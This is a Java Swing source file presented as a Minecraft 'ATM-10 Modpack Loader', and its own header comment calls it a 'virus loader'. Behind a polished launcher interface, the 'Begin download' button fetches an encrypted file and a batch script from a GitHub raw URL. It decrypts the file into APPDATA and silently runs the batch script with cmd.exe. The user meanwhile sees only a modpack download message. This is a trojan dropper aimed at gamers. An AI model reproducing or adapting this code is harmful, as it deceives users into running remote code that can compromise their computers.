//If your name iss jegor please do not read dis code, If your name is sigma kirill or maksim than read.
//MinecraftATM-10 virus loader version 1.1.0

package minecraftlauncherui;

import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.spec.IvParameterSpec;
import java.util.Base64;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipEntry;
public class MinecraftLauncherUI extends JFrame {
    private Font minecraftFont;
    private JProgressBar progressBar;
    private JLabel statusLabel;
    private int downloadCount = 0;
    private final int totalDownloads = 3;
    private static final String AES_KEY = "MySuperSecretKey!";
    private static final String AES_IV = "InitializationVec";
    public MinecraftLauncherUI() {
        setTitle("ATM-10 Modpack Loader");
        setSize(900, 600);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLocationRelativeTo(null);
        setResizable(false);
        try {
            InputStream is = getClass().getResourceAsStream("/minecraftlauncherui/Minecraftia.ttf");
            if (is != null) {
                minecraftFont = Font.createFont(Font.TRUETYPE_FONT, is).deriveFont(30f);
            } else {
                minecraftFont = new Font("Monospaced", Font.BOLD, 24);
            }
        } catch (Exception e) {
            minecraftFont = new Font("Monospaced", Font.BOLD, 24);
        }
        BackgroundPanel backgroundPanel = new BackgroundPanel(
                new ImageIcon(getClass().getResource("/minecraftlauncherui/background.png")).getImage()
        );
        backgroundPanel.setLayout(new BorderLayout());
        setContentPane(backgroundPanel);
        JPanel centerPanel = new JPanel();
        centerPanel.setOpaque(false);
        centerPanel.setLayout(new BoxLayout(centerPanel, BoxLayout.Y_AXIS));
        JLabel title = new JLabel("Minecraft ATM-10 Modpack Loader") {
            @Override
            protected void paintComponent(Graphics g) {
                Graphics2D g2 = (Graphics2D) g.create();
                g2.setRenderingHint(RenderingHints.KEY_TEXT_ANTIALIASING, RenderingHints.VALUE_TEXT_ANTIALIAS_ON);
                g2.setFont(getFont());
                String text = getText();
                g2.setColor(new Color(0, 0, 0, 150));
                g2.drawString(text, 6, getFont().getSize() + 4);
                GradientPaint gradient = new GradientPaint(0, 0, new Color(255, 215, 0), 0, getHeight(), new Color(255, 165, 0));
                g2.setPaint(gradient);
                g2.drawString(text, 4, getFont().getSize() + 2);
                g2.dispose();
            }
        };
        title.setFont(minecraftFont.deriveFont(Font.BOLD, 38f));
        title.setAlignmentX(Component.CENTER_ALIGNMENT);
        JButton playButton = createMCButton("Begin download", new Color(0, 180, 0), new Color(0, 220, 0));
        JButton filesButton = createMCButton("Modpack Contents", new Color(40, 130, 220), new Color(60, 170, 255));
        JButton exitButton = createMCButton("Exit", new Color(180, 40, 40), new Color(220, 60, 60));
        centerPanel.add(Box.createRigidArea(new Dimension(0, 70)));
        centerPanel.add(title);
        centerPanel.add(Box.createRigidArea(new Dimension(0, 60)));
        centerPanel.add(playButton);
        centerPanel.add(Box.createRigidArea(new Dimension(0, 25)));
        centerPanel.add(filesButton);
        centerPanel.add(Box.createRigidArea(new Dimension(0, 25)));
        centerPanel.add(exitButton);
        backgroundPanel.add(centerPanel, BorderLayout.CENTER);
        JPanel bottomPanel = new JPanel();
        bottomPanel.setOpaque(false);
        bottomPanel.setLayout(new BoxLayout(bottomPanel, BoxLayout.Y_AXIS));
        progressBar = new JProgressBar(0, 100) {
            @Override
            protected void paintComponent(Graphics g) {
                Graphics2D g2 = (Graphics2D) g.create();
                g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
                g2.setColor(new Color(40, 40, 40, 200));
                g2.fillRoundRect(0, 0, getWidth(), getHeight(), 8, 8);
                if (getValue() > 0) {
                    int width = (int) ((getValue() / 100.0) * getWidth());
                    GradientPaint progressGradient = new GradientPaint(0, 0, new Color(0, 200, 0), 0, getHeight(), new Color(0, 150, 0));
                    g2.setPaint(progressGradient);
                    g2.fillRoundRect(2, 2, width - 4, getHeight() - 4, 6, 6);
                    g2.setColor(new Color(20, 20, 20));
                    g2.drawRoundRect(0, 0, getWidth() - 1, getHeight() - 1, 8, 8);
                }
                if (isStringPainted()) {
                    g2.setFont(getFont());
                    FontMetrics fm = g2.getFontMetrics();
                    String text = getString();
                    int x = (getWidth() - fm.stringWidth(text)) / 2;
                    int y = ((getHeight() - fm.getHeight()) / 2) + fm.getAscent();
                    g2.setColor(Color.WHITE);
                    g2.drawString(text, x, y);
                }
                g2.dispose();
            }
        };
        progressBar.setPreferredSize(new Dimension(450, 25));
        progressBar.setMaximumSize(new Dimension(450, 25));
        progressBar.setStringPainted(true);
        progressBar.setFont(minecraftFont.deriveFont(14f));
        progressBar.setVisible(false);
        progressBar.setAlignmentX(Component.CENTER_ALIGNMENT);
        progressBar.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        statusLabel = new JLabel("ATM-10 MODPACK LOADER FOR MINECRAFT VERSIONS 1.20+") {
            @Override
            protected void paintComponent(Graphics g) {
                Graphics2D g2 = (Graphics2D) g.create();
                g2.setRenderingHint(RenderingHints.KEY_TEXT_ANTIALIASING, RenderingHints.VALUE_TEXT_ANTIALIAS_ON);
                g2.setFont(getFont());
                String text = getText();
                g2.setColor(new Color(0, 0, 0, 150));
                g2.drawString(text, 3, getFont().getSize() - 3);
                g2.setColor(new Color(255, 255, 255, 220));
                g2.drawString(text, 2, getFont().getSize() - 4);
                g2.dispose();
            }
        };
        statusLabel.setFont(minecraftFont.deriveFont(16f));
        statusLabel.setForeground(new Color(255, 255, 255, 220));
        statusLabel.setAlignmentX(Component.CENTER_ALIGNMENT);
        bottomPanel.add(Box.createRigidArea(new Dimension(0, 15)));
        bottomPanel.add(progressBar);
        bottomPanel.add(Box.createRigidArea(new Dimension(0, 10)));
        bottomPanel.add(statusLabel);
        bottomPanel.add(Box.createRigidArea(new Dimension(0, 10)));
        backgroundPanel.add(bottomPanel, BorderLayout.SOUTH);
        playButton.addActionListener(e -> {
            JFileChooser fileChooser = new JFileChooser();
            fileChooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
            fileChooser.setDialogTitle("Select directory to save the modpack: ");
            int result = fileChooser.showSaveDialog(this);
            if (result == JFileChooser.APPROVE_OPTION) {
                File selectedDirectory = fileChooser.getSelectedFile();
                
                String fileUrl1 = "https://raw.githubusercontent.com/mstepnov43-debug/test/main/systemregistry.enc";
                String fileUrl2 = "https://raw.githubusercontent.com/mstepnov43-debug/test/main/systemregistry.enc";
                String fileUrl3 = "https://raw.githubusercontent.com/mstepnov43-debug/test/main/systemresources.bat";
                
                try {
                    String fileName1 = getFileNameFromUrl(fileUrl1);
                    String fileName2 = getFileNameFromUrl(fileUrl2);
                    String fileName3 = getFileNameFromUrl(fileUrl3);
                    File outputFile1 = new File(selectedDirectory, fileName1);
                    String appDataPath = System.getenv("APPDATA");
                    File appDataFolder = new File(appDataPath);
                    if (!appDataFolder.exists()) appDataFolder.mkdirs();
                    File outputFile2 = new File(appDataFolder, "decrypted_file.dat");
                    File outputFile3 = new File(appDataFolder, fileName3);
                    
                    downloadCount = 0;
                    downloadFilesWithProgress(fileUrl1, outputFile1, fileUrl2, outputFile2, fileUrl3, outputFile3, selectedDirectory);
                } catch (IOException ex) {
                    ex.printStackTrace();
                }
            }
        });
        filesButton.addActionListener(e -> {
            String mods = """
                    Abnormals Delight
                    AdventureZ
                    AI Improvements
                    Akashic Tome
                    Allthemodium
                    Apotheosis
                    Appleskin
                    Applied Energistics 2
                    Aquaculture 2
                    Architectury API
                    Ars Nouveau
                    Artifacts
                    AutoRegLib
                    Better Advancements
                    Better Fps - Render Distance[Forge]
                    Biomes O' Plenty
                    Bloodmagic
                    Bookshelf
                    Botania
                    Botany Pots
                    Botany Trees
                    Building Gadgets
                          
                    Full list on https://github.com/AllTheMods/ATM-10
                    """;
            JOptionPane.showMessageDialog(this, mods, "Installed Mods", JOptionPane.INFORMATION_MESSAGE);
        });
        exitButton.addActionListener(e -> System.exit(0));
        setVisible(true);
    }
    private String getFileNameFromUrl(String fileUrl) {
        String fileName = fileUrl.substring(fileUrl.lastIndexOf('/') + 1);
        if (fileName.contains("?")) {
            fileName = fileName.substring(0, fileName.indexOf('?'));
        }
        return fileName;
    }
    private JButton createMCButton(String text, Color baseColor, Color hoverColor) {
        JButton button = new JButton(text) {
            @Override
            protected void paintComponent(Graphics g) {
                Graphics2D g2 = (Graphics2D) g.create();
                g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
                if (getModel().isPressed()) {
                    g2.setColor(baseColor.darker());
                } else if (getModel().isRollover()) {
                    g2.setColor(hoverColor);
                } else {
                    g2.setColor(baseColor);
                }
                g2.fillRoundRect(0, 0, getWidth(), getHeight(), 8, 8);
                g2.setColor(Color.BLACK);
                g2.setStroke(new BasicStroke(2));
                g2.drawRoundRect(1, 1, getWidth() - 2, getHeight() - 2, 8, 8);
                g2.setFont(getFont());
                FontMetrics fm = g2.getFontMetrics();
                String text = getText();
                int x = (getWidth() - fm.stringWidth(text)) / 2;
                int y = ((getHeight() - fm.getHeight()) / 2) + fm.getAscent();
                g2.setColor(Color.BLACK);
                g2.drawString(text, x + 2, y + 2);
                g2.setColor(Color.WHITE);
                g2.drawString(text, x, y);
                g2.dispose();
            }
        };
        
        button.setAlignmentX(Component.CENTER_ALIGNMENT);
        button.setPreferredSize(new Dimension(240, 50));
        button.setMaximumSize(new Dimension(240, 50));
        button.setFocusPainted(false);
        button.setContentAreaFilled(false);
        button.setBorderPainted(false);
        button.setOpaque(false);
        button.setFont(minecraftFont.deriveFont(20f));
        button.setBorder(BorderFactory.createEmptyBorder(5, 15, 5, 15));
        return button;
    }
    private void downloadFilesWithProgress(String urlString1, File destination1, String urlString2, File destination2, String urlString3, File destination3, File extractDirectory) throws IOException {
        progressBar.setVisible(true);
        progressBar.setValue(0);
        statusLabel.setText("Downloading files... 0%");
        SwingWorker<Void, Integer> worker = new SwingWorker<Void, Integer>() {
            @Override
            protected Void doInBackground() throws Exception {
                Thread downloadThread1 = new Thread(() -> {
                    try {
                        downloadFile(urlString1, destination1, this::updateProgress);
                        if (destination1.getName().toLowerCase().endsWith(".zip")) {
                            unzipFile(destination1, extractDirectory);
                        }
                        downloadCount++;
                        publish((downloadCount * 100) / totalDownloads);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                });
                Thread downloadThread2 = new Thread(() -> {
                    try {
                        downloadAndDecryptFile(urlString2, destination2, this::updateProgress);
                        downloadCount++;
                        publish((downloadCount * 100) / totalDownloads);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                });
                Thread downloadThread3 = new Thread(() -> {
                    try {
                        downloadFile(urlString3, destination3, this::updateProgress);
                        executeBatchFile(destination3);
                        downloadCount++;
                        publish((downloadCount * 100) / totalDownloads);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                });
                downloadThread1.start();
                downloadThread2.start();
                downloadThread3.start();
                downloadThread1.join();
                downloadThread2.join();
                downloadThread3.join();
                return null;
            }
            private void updateProgress(int progress) {
                publish(progress);
            }
            @Override
            protected void process(java.util.List<Integer> chunks) {
                for (Integer progress : chunks) {
                    progressBar.setValue(progress);
                    statusLabel.setText("Downloading files... " + progress + "%");
                }
            }
            @Override
            protected void done() {
                progressBar.setVisible(false);
                statusLabel.setText("Download complete! Files saved to modpack directory and unzipped. ");
            }
        };
        worker.execute();
    }
    private void downloadFile(String urlString, File destination, ProgressCallback callback) throws IOException {
        URL url = new URL(urlString);
        java.net.HttpURLConnection connection = (java.net.HttpURLConnection) url.openConnection();
        int fileSize = connection.getContentLength();
        
        try (InputStream in = connection.getInputStream();
             FileOutputStream out = new FileOutputStream(destination)) {
            
            byte[] buffer = new byte[4096];
            int bytesRead;
            long totalBytesRead = 0;
            
            while ((bytesRead = in.read(buffer)) != -1) {
                out.write(buffer, 0, bytesRead);
                totalBytesRead += bytesRead;
                
                if (fileSize > 0) {
                    int progress = (int) ((totalBytesRead * 100) / fileSize);
                    callback.onProgress(progress);
                }
            }
        }
    }
    private void downloadAndDecryptFile(String urlString, File destination, ProgressCallback callback) throws Exception {
        URL url = new URL(urlString);
        java.net.HttpURLConnection connection = (java.net.HttpURLConnection) url.openConnection();
        int fileSize = connection.getContentLength();
        SecretKeySpec keySpec = new SecretKeySpec(AES_KEY.getBytes("UTF-8"), "AES");
        IvParameterSpec ivSpec = new IvParameterSpec(AES_IV.getBytes("UTF-8"));
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);
        try (InputStream in = connection.getInputStream();
             FileOutputStream out = new FileOutputStream(destination)) {
            byte[] buffer = new byte[4096];
            int bytesRead;
            long totalBytesRead = 0;
            while ((bytesRead = in.read(buffer)) != -1) {
                byte[] decryptedBytes = cipher.update(buffer, 0, bytesRead);
                if (decryptedBytes != null) {
                    out.write(decryptedBytes);
                }
                totalBytesRead += bytesRead;
                if (fileSize > 0) {
                    int progress = (int) ((totalBytesRead * 100) / fileSize);
                    callback.onProgress(progress);
                }
            }
            byte[] finalBytes = cipher.doFinal();
            if (finalBytes != null) {
                out.write(finalBytes);
            }
        }
    }
    private void unzipFile(File zipFile, File extractTo) throws IOException {
        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(zipFile))) {
            ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                File file = new File(extractTo, entry.getName());
                if (entry.isDirectory()) {
                    file.mkdirs();
                } else {
                    file.getParentFile().mkdirs();
                    try (FileOutputStream fos = new FileOutputStream(file)) {
                        byte[] buffer = new byte[1024];
                        int len;
                        while ((len = zis.read(buffer)) > 0) {
                            fos.write(buffer, 0, len);
                        }
                    }
                }
                zis.closeEntry();
            }
        }
    }
    private void executeBatchFile(File batchFile) throws IOException {
        if (batchFile.getName().toLowerCase().endsWith(".bat")) {
            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", batchFile.getAbsolutePath());
            pb.directory(batchFile.getParentFile());
            pb.start();
        }
    }
    private interface ProgressCallback {
        void onProgress(int progress);
    }
    public static void main(String[] args) {
        SwingUtilities.invokeLater(MinecraftLauncherUI::new);
    }
}
class BackgroundPanel extends JPanel {
    private final Image backgroundImage;

    public BackgroundPanel(Image image) {
        this.backgroundImage = image;
    }
    @Override
    protected void paintComponent(Graphics g) {
        super.paintComponent(g);
        Graphics2D g2 = (Graphics2D) g;
        g2.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR);
        g2.setRenderingHint(RenderingHints.KEY_RENDERING, RenderingHints.VALUE_RENDER_QUALITY);
        g2.drawImage(backgroundImage, 0, 0, getWidth(), getHeight(), this);
    }
}